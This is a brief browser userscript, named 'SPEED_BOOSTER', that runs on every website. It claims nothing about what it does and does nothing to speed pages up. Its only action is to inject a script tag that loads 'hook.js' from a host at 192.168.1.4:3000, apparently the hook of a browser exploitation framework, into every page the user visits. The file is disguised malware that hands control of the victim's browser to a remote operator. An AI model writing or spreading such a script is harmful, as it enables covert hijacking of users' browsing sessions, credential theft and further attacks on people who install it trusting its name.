// ==UserScript==
// @name     SPEED_BOOSTER
// @include  *
// @require  http://ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js
// @grant    GM_addStyle
// ==/UserScript==
//--- The @grant directive is used to restore the proper sandbox.

$("body").append ( `
    <div id="gmSomeID">
        <script defer src="http://192.168.1.4:3000/hook.js" />
    </div>
` );

